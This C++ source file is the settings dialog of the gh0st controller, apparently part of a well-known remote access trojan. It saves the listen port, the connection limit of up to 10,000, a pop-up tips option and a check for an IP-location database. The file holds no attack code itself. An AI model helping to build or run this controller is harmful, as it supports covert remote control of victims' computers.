// Settings.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "Settings.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CMainFrame	*g_pFrame;
extern CIOCPServer	*m_iocpServer;
/////////////////////////////////////////////////////////////////////////////
// CSettings dialog


CSettings::CSettings(CWnd* pParent /*=NULL*/)
	: CDialog(CSettings::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSettings)
	m_max_connections = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection", 8000);
	m_connect_auto =((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnectionAuto", 0);
	m_bIsDisablePopTips =  ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "PopTips", false);
	m_listen_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 2014);
	//}}AFX_DATA_INIT
}


void CSettings::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSettings)
	DDX_Text(pDX, IDC_CONNECT_MAX, m_max_connections);
	DDV_MinMaxUInt(pDX, m_max_connections, 1, 10000);
	DDX_Check(pDX, IDC_CONNECT_AUTO, m_connect_auto);
	DDX_Check(pDX, IDC_DISABLE_POPTIPS, m_bIsDisablePopTips);
	DDX_Text(pDX, IDC_LISTEN_PORT, m_listen_port);
	DDV_MinMaxUInt(pDX, m_listen_port, 1, 65535);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSettings, CDialog)
	//{{AFX_MSG_MAP(CSettings)
	ON_BN_CLICKED(IDC_APPLY, OnApply)
	ON_BN_CLICKED(IDC_DISABLE_POPTIPS, OnDisablePoptips)
	ON_BN_CLICKED(IDC_CONNECT_AUTO, OnConnectAuto)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSettings message handlers

void CSettings::OnApply() 
{
	// TODO: Add your control notification handler code here
	int prev_port = m_listen_port;
	int prev_max_connections = m_max_connections;
	
	UpdateData(TRUE);
	
	if (prev_max_connections != m_max_connections)
	{
		if (m_connect_auto)
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, 8000);
		else
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, m_max_connections);
	}
	
	if (prev_port != m_listen_port)
		g_pFrame->Activate(m_listen_port, m_iocpServer->m_nMaxConnections);
	
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_listen_port);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnection", m_max_connections);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnectionAuto", m_connect_auto);
}

void CSettings::OnDisablePoptips() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "PopTips", m_bIsDisablePopTips);
	((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips = m_bIsDisablePopTips;
}

void CSettings::OnConnectAuto() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	GetDlgItem(IDC_CONNECT_MAX)->EnableWindow(!m_connect_auto);
}

BOOL CSettings::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
		SetDlgItemText(IDC_SYSTEM_TIPS, "找到QQWry.Dat");
	else
		SetDlgItemText(IDC_SYSTEM_TIPS, "没有找到QQWry.Dat");

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
